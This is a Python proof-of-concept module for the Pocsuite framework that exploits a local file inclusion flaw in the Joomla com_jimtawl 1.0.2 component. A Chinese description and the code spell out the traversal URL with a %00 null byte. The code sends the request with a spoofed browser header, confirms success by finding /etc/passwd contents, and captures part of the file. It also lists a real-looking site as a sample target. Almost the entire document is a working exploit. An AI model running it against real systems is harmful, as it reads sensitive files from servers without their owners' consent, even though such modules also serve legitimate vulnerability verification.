#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '70258'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2011-03-23'
    createDate = '2016-02-13'
    updateDate = '2016-02-13'
    references = ['http://www.seebug.org/vuldb/ssvid-70258']
    name = 'Joomla Component (com_jimtawl) Local File Inclusion Vulnerability'
    appPowerLink = 'http://www.joomla.org'
    appName = 'Joomla Component (com_jimtawl)'
    appVersion = '1.0.2'
    vulType = 'Local File Inclusion'
    desc = '''
        Joomla!的 Jimtawl（com_jimtawl）组件1.0.2版本中存在目录遍历漏洞。
        远程攻击者可以借助向index.php传递的task参数中的“..”操作符，
        读取任意文件或者可能引起其他未明影响。

        该漏洞利用成功需要具备两个条件：
        (1)magic_quotes_gpc=off
        (2)PHP小于5.3.4

        该漏洞读取/etc/passwd的POC如下：
        http://***/index.php?option=com_jimtawl&Itemid=12&task=
        ../../../../../../../../../../../../../../../etc/passwd%00

        验证效果图如下所示：
        http://pan.baidu.com/s/1jHhgSKm
    '''
    samples = ['http://www.atbc.net.au']

    def _attack(self):
        return self._verify()

    def _verify(self):
        #尝试利用LFI来读取/etc/passwd的内容
        result = {}
        #读取的文件名
        filename='/etc/passwd'
        #漏洞路径
        exploit='/index.php?option=com_jimtawl&Itemid=12&task='
        #截断符号
        dBs='%00'
        #..的个数
        dots='../../../../../../../../../../../../../../..'
        #漏洞利用地址
        vulurl=self.url+exploit+dots+filename+dBs
        #伪造的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #发送请求，并返回结果
        resp=req.get(vulurl,headers=httphead,timeout=50)
        #根据状态码和返回文件的内容，判断是否利用成功
        if resp.status_code==200 and re.match('root:.+?:0:0:.+?:.+?:.+?', resp.content):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulurl
            #记录文件内容
            result['Fileinfo']={}
            result['Fileinfo']['Filename']=filename
            result['Fileinfo']['Content']=resp.content[0:32]+'...'
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)